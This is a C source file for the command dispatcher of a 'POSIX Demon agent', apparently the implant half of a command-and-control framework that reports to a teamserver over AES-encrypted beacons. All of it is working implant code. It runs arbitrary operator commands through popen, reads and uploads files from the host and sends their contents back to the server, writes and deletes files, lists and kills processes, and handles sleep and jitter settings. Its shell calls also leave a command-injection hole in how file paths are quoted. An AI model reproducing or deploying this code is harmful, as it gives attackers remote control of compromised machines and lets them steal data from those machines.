/*
 * Command.c — Command dispatcher and core command implementations
 *             for the POSIX Demon agent.
 *
 * Handles: SLEEP, EXIT, FS (dir/pwd/cd/cat/mkdir/rm/cp/mv/download/upload),
 *          PROC (list/kill), and OUTPUT/BEACON_OUTPUT echo.
 *
 * Commands that need platform-specific code call out to Inject.c,
 * Persist.c, and Pivot.c.
 */

#include "DemonPosix.h"
#include <dirent.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <pwd.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>

#ifdef __APPLE__
#  include <libproc.h>
#  include <sys/proc_info.h>
#else
#  include <sys/ptrace.h>
#endif

/* ── Forward declarations ────────────────────────────────────────────── */
static void send_output(uint32_t reqID, uint32_t cmdID, const char *text);
static void cmd_fs(uint32_t reqID, PARSER *p);
static void cmd_proc(uint32_t reqID, PARSER *p);
static void cmd_socket(uint32_t reqID, PARSER *p);
void CmdSleep(uint32_t reqID, PARSER *p);
void CmdExit(uint32_t reqID, PARSER *p);
void CmdOutput(uint32_t reqID, const char *text);
void CmdFs(uint32_t reqID, PARSER *p);
void CmdProcCreate(uint32_t reqID, PARSER *p);
void CmdProc(uint32_t reqID, PARSER *p);
void CmdSocket(uint32_t reqID, PARSER *p);
void CmdPosixToken(uint32_t reqID, PARSER *p);
static char *run_shell(const char *cmd, size_t *out_len);

/* ── Dispatcher ──────────────────────────────────────────────────────── */
void CommandDispatcher(uint32_t cmdID, uint32_t reqID, PARSER *parser)
{
    DEMON_LOG("CommandDispatcher: cmd=0x%x req=0x%x", cmdID, reqID);

    /* COMMAND_NOJOB (10) — heartbeat, nothing to do */
    if (cmdID == 10) return;

    /* Guard against null parser for commands that need data */
    if (!parser && cmdID != COMMAND_EXIT) return;

    switch (cmdID) {
    case COMMAND_SLEEP:     CmdSleep(reqID, parser);      break;
    case COMMAND_EXIT:      CmdExit(reqID, parser);        break;
    case COMMAND_FS:        CmdFs(reqID, parser);          break;
    case COMMAND_PROC:      CmdProcCreate(reqID, parser);  break;
    case COMMAND_PROC_LIST: CmdProc(reqID, parser);        break;
    case COMMAND_TOKEN:     CmdPosixToken(reqID, parser);  break;
    case COMMAND_SOCKET:    CmdSocket(reqID, parser);      break;
    case COMMAND_SCREENSHOT: CmdOutput(reqID, "[-] Screenshot not supported on this platform\n"); break;
    case BEACON_OUTPUT:     /* agent-side is a no-op */ break;
    default:
        DEMON_LOG("Unknown command 0x%x", cmdID);
        {
            char msg[128];
            snprintf(msg, sizeof(msg), "[-] Unknown command: 0x%x\n", cmdID);
            CmdOutput(reqID, msg);
        }
        break;
    }
}

/* ── SLEEP ───────────────────────────────────────────────────────────── */
void CmdSleep(uint32_t reqID, PARSER *p)
{
    int32_t delay  = ParserReadInt32(p);
    int32_t jitter = ParserReadInt32(p);

    if (delay  < 0) delay  = 0;
    if (jitter < 0) jitter = 0;
    if (jitter > 100) jitter = 100;

    DemonInstance->Session.SleepDelay  = (uint32_t)delay;
    DemonInstance->Session.SleepJitter = (uint32_t)jitter;

    char msg[128];
    snprintf(msg, sizeof(msg), "[*] Sleep: %ds jitter %d%%\n", delay, jitter);
    CmdOutput(reqID, msg);
}

/* ── EXIT ────────────────────────────────────────────────────────────── */
void CmdExit(uint32_t reqID, PARSER *p)
{
    (void)reqID; (void)p;
    DemonInstance->ShouldExit = true;
}

/* ── OUTPUT (send text back to teamserver) ───────────────────────────── */
/*
 * BEACON_OUTPUT payload format (matches TeamServer TaskDispatch):
 *   [4 BE] Type = CALLBACK_OUTPUT (0x0) — sub-type read by TaskDispatch
 *   [4 BE] length + [N] output bytes   — read by ParseBytes()
 */
#define CALLBACK_OUTPUT 0x0

void CmdOutput(uint32_t reqID, const char *text)
{
    if (!text) return;

    PKG_BUFFER *pkg = PkgCreate(BEACON_OUTPUT, reqID);
    if (!pkg) return;

    PkgAddInt32(pkg, CALLBACK_OUTPUT);  /* sub-type prefix required by TaskDispatch */
    PkgAddString(pkg, text);

    size_t   msg_len = 0;
    uint8_t *msg     = PkgBuildMessage(pkg, DemonInstance->Encryption.AesKey,
                                       DemonInstance->Encryption.AesIv, &msg_len);
    PkgFree(pkg);

    if (msg) {
        uint8_t *resp = NULL; size_t resp_len = 0;
        TransportSendRecv(msg, msg_len, &resp, &resp_len);
        free(msg);
        if (resp) free(resp);
    }
}

/* ── TOKEN commands (macOS/Linux/Android) ────────────────────────────── */
void CmdPosixToken(uint32_t reqID, PARSER *p)
{
    if (!p || p->Length < 4) {
        char *out = run_shell("id 2>&1", NULL);
        CmdOutput(reqID, out ? out : "");
        if (out) free(out);
        return;
    }

    /* SubCommand is sent as a string in the token packet */
    char *sub = ParserReadString(p);
    if (!sub) sub = "";

    if (strncmp(sub, "getuid", 6) == 0 || strncmp(sub, "whoami", 6) == 0 ||
        strncmp(sub, "list", 4) == 0) {
        char *out = run_shell("id 2>&1 && whoami 2>&1", NULL);
        CmdOutput(reqID, out ? out : "");
        if (out) free(out);
    } else if (strncmp(sub, "privs-list", 10) == 0) {
        char *out = run_shell("cat /proc/self/status 2>/dev/null || id 2>&1", NULL);
        CmdOutput(reqID, out ? out : "");
        if (out) free(out);
    } else {
        char msg[128];
        snprintf(msg, sizeof(msg), "[-] Token sub-command '%s' not supported on POSIX\n", sub);
        CmdOutput(reqID, msg);
    }
}

/* ── FS commands ─────────────────────────────────────────────────────── */

/* Helper: run a shell command and capture stdout+stderr */
static char *run_shell(const char *cmd, size_t *out_len)
{
    FILE *fp = popen(cmd, "r");
    if (!fp) return NULL;

    char   *buf  = NULL;
    size_t  size = 0;
    size_t  cap  = 0;
    char    tmp[4096];

    while (fgets(tmp, sizeof(tmp), fp)) {
        size_t chunk = strlen(tmp);
        if (size + chunk + 1 > cap) {
            cap = (size + chunk + 1) * 2 + 512;
            buf = (char *)realloc(buf, cap);
            if (!buf) { pclose(fp); return NULL; }
        }
        memcpy(buf + size, tmp, chunk);
        size += chunk;
    }
    pclose(fp);

    if (buf) {
        buf[size] = '\0';
        if (out_len) *out_len = size;
    }
    return buf;
}

static void fs_dir(uint32_t reqID, PARSER *p)
{
    char *path = ParserReadString(p);
    if (!path || path[0] == '\0') path = ".";

    char cmd[4096 + 32];
    snprintf(cmd, sizeof(cmd), "ls -la '%s' 2>&1", path);

    size_t len = 0;
    char  *out = run_shell(cmd, &len);
    if (!out) out = strdup("[-] Failed to list directory\n");

    CmdOutput(reqID, out);
    free(out);
}

static void fs_pwd(uint32_t reqID, PARSER *p)
{
    (void)p;
    char buf[4096];
    if (!getcwd(buf, sizeof(buf)))
        snprintf(buf, sizeof(buf), "[-] getcwd failed: %s\n", strerror(errno));
    else
        strncat(buf, "\n", sizeof(buf) - strlen(buf) - 1);
    CmdOutput(reqID, buf);
}

static void fs_cd(uint32_t reqID, PARSER *p)
{
    char *path = ParserReadString(p);
    char  msg[4096];
    if (chdir(path) != 0)
        snprintf(msg, sizeof(msg), "[-] chdir failed: %s\n", strerror(errno));
    else
        snprintf(msg, sizeof(msg), "[+] Changed to: %s\n", path);
    CmdOutput(reqID, msg);
}

static void fs_cat(uint32_t reqID, PARSER *p)
{
    char *path = ParserReadString(p);
    char  cmd[4096 + 16];
    snprintf(cmd, sizeof(cmd), "cat '%s' 2>&1", path);
    size_t len = 0;
    char  *out = run_shell(cmd, &len);
    if (!out) out = strdup("[-] Failed to read file\n");
    CmdOutput(reqID, out);
    free(out);
}

static void fs_mkdir(uint32_t reqID, PARSER *p)
{
    char *path = ParserReadString(p);
    char  msg[4096];
    if (mkdir(path, 0755) != 0)
        snprintf(msg, sizeof(msg), "[-] mkdir failed: %s\n", strerror(errno));
    else
        snprintf(msg, sizeof(msg), "[+] Directory created: %s\n", path);
    CmdOutput(reqID, msg);
}

static void fs_remove(uint32_t reqID, PARSER *p)
{
    char *path = ParserReadString(p);
    char  cmd[4096 + 16];
    snprintf(cmd, sizeof(cmd), "rm -rf '%s' 2>&1", path);
    size_t len = 0;
    char  *out = run_shell(cmd, &len);
    if (!out) out = strdup("[+] Removed\n");
    CmdOutput(reqID, out);
    free(out);
}

static void fs_cp(uint32_t reqID, PARSER *p)
{
    char *src = ParserReadString(p);
    char *dst = ParserReadString(p);
    char  cmd[8192];
    snprintf(cmd, sizeof(cmd), "cp -r '%s' '%s' 2>&1", src, dst);
    size_t len = 0;
    char  *out = run_shell(cmd, &len);
    if (!out) out = strdup("[+] Copied\n");
    CmdOutput(reqID, out);
    free(out);
}

static void fs_mv(uint32_t reqID, PARSER *p)
{
    char *src = ParserReadString(p);
    char *dst = ParserReadString(p);
    char  cmd[8192];
    snprintf(cmd, sizeof(cmd), "mv '%s' '%s' 2>&1", src, dst);
    size_t len = 0;
    char  *out = run_shell(cmd, &len);
    if (!out) out = strdup("[+] Moved\n");
    CmdOutput(reqID, out);
    free(out);
}

static void fs_download(uint32_t reqID, PARSER *p)
{
    char *path = ParserReadString(p);
    int   fd   = open(path, O_RDONLY);
    if (fd < 0) {
        char msg[512];
        snprintf(msg, sizeof(msg), "[-] Cannot open file: %s\n", strerror(errno));
        CmdOutput(reqID, msg);
        return;
    }

    struct stat st;
    fstat(fd, &st);
    size_t   fsize = (size_t)st.st_size;
    uint8_t *fbuf  = (uint8_t *)malloc(fsize);
    if (!fbuf) { close(fd); CmdOutput(reqID, "[-] malloc failed\n"); return; }

    size_t total = 0;
    ssize_t n;
    while (total < fsize && (n = read(fd, fbuf + total, fsize - total)) > 0)
        total += (size_t)n;
    close(fd);

    /* Send as a bytes package — teamserver receives and saves to disk */
    PKG_BUFFER *pkg = PkgCreate(COMMAND_FS, reqID);
    PkgAddInt32(pkg, DEMON_COMMAND_FS_DOWNLOAD);
    PkgAddString(pkg, path);
    PkgAddBytes(pkg, fbuf, (uint32_t)total);
    free(fbuf);

    size_t   msg_len = 0;
    uint8_t *msg     = PkgBuildMessage(pkg, DemonInstance->Encryption.AesKey,
                                       DemonInstance->Encryption.AesIv, &msg_len);
    PkgFree(pkg);
    if (msg) {
        uint8_t *resp = NULL; size_t resp_len = 0;
        TransportSendRecv(msg, msg_len, &resp, &resp_len);
        free(msg);
        if (resp) free(resp);
    }
}

static void fs_upload(uint32_t reqID, PARSER *p)
{
    char    *path     = ParserReadString(p);
    uint32_t data_len = 0;
    uint8_t *data     = ParserReadBytes(p, &data_len);

    if (!data || data_len == 0) {
        CmdOutput(reqID, "[-] No data to upload\n");
        return;
    }

    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) {
        char msg[512];
        snprintf(msg, sizeof(msg), "[-] Cannot create file: %s\n", strerror(errno));
        CmdOutput(reqID, msg);
        return;
    }

    size_t  written = 0;
    ssize_t n;
    while (written < data_len) {
        n = write(fd, data + written, data_len - written);
        if (n < 0) break;
        written += (size_t)n;
    }
    close(fd);

    char msg[512];
    snprintf(msg, sizeof(msg), "[+] Uploaded %zu bytes to %s\n", written, path);
    CmdOutput(reqID, msg);
}

void CmdFs(uint32_t reqID, PARSER *p)
{
    int32_t sub = ParserReadInt32(p);
    switch (sub) {
    case DEMON_COMMAND_FS_DIR:      fs_dir(reqID, p);      break;
    case DEMON_COMMAND_FS_DOWNLOAD: fs_download(reqID, p); break;
    case DEMON_COMMAND_FS_UPLOAD:   fs_upload(reqID, p);   break;
    case DEMON_COMMAND_FS_CD:       fs_cd(reqID, p);       break;
    case DEMON_COMMAND_FS_REMOVE:   fs_remove(reqID, p);   break;
    case DEMON_COMMAND_FS_MKDIR:    fs_mkdir(reqID, p);    break;
    case DEMON_COMMAND_FS_CP:       fs_cp(reqID, p);       break;
    case DEMON_COMMAND_FS_MV:       fs_mv(reqID, p);       break;
    case DEMON_COMMAND_FS_PWD:      fs_pwd(reqID, p);      break;
    case DEMON_COMMAND_FS_CAT:      fs_cat(reqID, p);      break;
    default:
        CmdOutput(reqID, "[-] Unknown FS sub-command\n");
        break;
    }
}

/* ── Helper: decode UTF-16LE bytes to UTF-8 string ──────────────────── */
static char *utf16le_to_utf8(const uint8_t *data, uint32_t len)
{
    /* Simple ASCII-range UTF-16LE → UTF-8: take every other byte */
    size_t chars = len / 2;
    char  *out   = (char *)malloc(chars + 1);
    if (!out) return NULL;
    for (size_t i = 0; i < chars; i++) {
        out[i] = (char)data[i * 2];  /* low byte = ASCII char */
    }
    out[chars] = '\0';
    /* Strip trailing NUL chars */
    while (chars > 0 && out[chars-1] == '\0') { out[--chars] = '\0'; }
    return out;
}

/* ── COMMAND_PROC (0x1010) — Process creation ────────────────────────
 * Server sends: [subcmd LE][state LE][process UTF-16 bytes LE len+data]
 *               [args UTF-16 bytes LE len+data][piped LE][verbose LE]
 *
 * For POSIX we ignore the Windows process path and just run the args
 * via sh -c. The args for 'shell <cmd>' are "/c <cmd>" (cmd.exe style)
 * so we strip the "/c " prefix and run the rest.
 */
void CmdProcCreate(uint32_t reqID, PARSER *p)
{
    if (!p || p->Length < 4) {
        CmdOutput(reqID, "[-] PROC: no data\n");
        return;
    }

    uint32_t sub = (uint32_t)ParserReadInt32(p);

    if (sub == DEMON_COMMAND_PROC_CREATE) { /* = 4 */
        /* state */ ParserReadInt32(p);

        /* Process path (UTF-16LE, skip it — we use sh) */
        uint32_t proc_len = 0;
        uint8_t *proc_raw = ParserReadBytes(p, &proc_len);
        (void)proc_raw; (void)proc_len;

        /* Process args (UTF-16LE) — for shell cmd this is "/c <command>" */
        uint32_t args_len = 0;
        uint8_t *args_raw = ParserReadBytes(p, &args_len);

        char *args_str = args_raw ? utf16le_to_utf8(args_raw, args_len) : strdup("");

        /* Strip leading "/c " or "/C " (cmd.exe convention) */
        const char *cmd = args_str ? args_str : "";
        if (cmd[0] == '/' && (cmd[1] == 'c' || cmd[1] == 'C') && cmd[2] == ' ')
            cmd += 3;

        /* Execute via sh */
        char  shell_cmd[4096];
        snprintf(shell_cmd, sizeof(shell_cmd), "%s", cmd);
        char  *out = run_shell(shell_cmd, NULL);
        CmdOutput(reqID, out ? out : "");
        if (out) free(out);
        if (args_str) free(args_str);

    } else if (sub == DEMON_COMMAND_PROC_KILL) { /* = 7 */
        uint32_t pid = (uint32_t)ParserReadInt32(p);
        char msg[128];
        if (kill((pid_t)pid, SIGKILL) == 0)
            snprintf(msg, sizeof(msg), "[+] Killed PID %u\n", pid);
        else
            snprintf(msg, sizeof(msg), "[-] kill(%u) failed: %s\n", pid, strerror(errno));
        CmdOutput(reqID, msg);

    } else {
        char msg[64];
        snprintf(msg, sizeof(msg), "[-] PROC sub=0x%x not implemented\n", sub);
        CmdOutput(reqID, msg);
    }
}

/* ── PROC commands ───────────────────────────────────────────────────── */

static void proc_list(uint32_t reqID)
{
#ifdef __APPLE__
    /* macOS: use ps to list processes */
    char *out = NULL;
    size_t len = 0;
    out = run_shell("ps aux 2>&1", &len);
    if (!out) out = strdup("[-] ps failed\n");
    CmdOutput(reqID, out);
    free(out);
#else
    /* Linux: iterate /proc */
    char output[DEMON_MAX_PACKAGE_SIZE];
    int  off = 0;
    off += snprintf(output + off, sizeof(output) - off,
                    "%-8s %-8s %-6s %-40s\n",
                    "PID", "PPID", "UID", "NAME");

    DIR *d = opendir("/proc");
    if (!d) { CmdOutput(reqID, "[-] opendir(/proc) failed\n"); return; }

    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        if (ent->d_type != DT_DIR) continue;
        /* Check if directory name is all digits */
        bool is_pid = true;
        for (char *c = ent->d_name; *c; c++) {
            if (*c < '0' || *c > '9') { is_pid = false; break; }
        }
        if (!is_pid) continue;

        char status_path[64];
        snprintf(status_path, sizeof(status_path), "/proc/%s/status", ent->d_name);
        FILE *f = fopen(status_path, "r");
        if (!f) continue;

        char  name[256] = "";
        int   pid=0, ppid=0, uid=0;
        char  line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strncmp(line, "Name:", 5) == 0)  sscanf(line, "Name:\t%255s", name);
            if (strncmp(line, "Pid:",  4) == 0)  sscanf(line, "Pid:\t%d",  &pid);
            if (strncmp(line, "PPid:", 5) == 0)  sscanf(line, "PPid:\t%d", &ppid);
            if (strncmp(line, "Uid:",  4) == 0)  sscanf(line, "Uid:\t%d",  &uid);
        }
        fclose(f);

        if ((size_t)off < sizeof(output) - 80) {
            off += snprintf(output + off, sizeof(output) - off,
                            "%-8d %-8d %-6d %-40s\n", pid, ppid, uid, name);
        }
    }
    closedir(d);
    CmdOutput(reqID, output);
#endif
}

static void proc_kill(uint32_t reqID, PARSER *p)
{
    int32_t pid = ParserReadInt32(p);
    char    msg[128];
    if (kill((pid_t)pid, SIGKILL) == 0)
        snprintf(msg, sizeof(msg), "[+] Killed PID %d\n", pid);
    else
        snprintf(msg, sizeof(msg), "[-] kill(%d) failed: %s\n", pid, strerror(errno));
    CmdOutput(reqID, msg);
}

void CmdProc(uint32_t reqID, PARSER *p)
{
    int32_t sub = ParserReadInt32(p);
    switch (sub) {
    case DEMON_COMMAND_PROC_LIST:  proc_list(reqID);       break;
    case DEMON_COMMAND_PROC_KILL:  proc_kill(reqID, p);    break;
    default:
        CmdOutput(reqID, "[-] Unknown PROC sub-command\n");
        break;
    }
}

/* ── SOCKET (SOCKS5 / rportfwd) ──────────────────────────────────────── */
/* Thin stubs — full implementation lives in Pivot.c / Socket.c */
void CmdSocket(uint32_t reqID, PARSER *p)
{
    int32_t sub = ParserReadInt32(p);
    (void)sub; (void)p;
    /* TODO: forward to Pivot/Socket implementation */
    CmdOutput(reqID, "[-] SOCKET command: not yet fully implemented on POSIX\n");
}
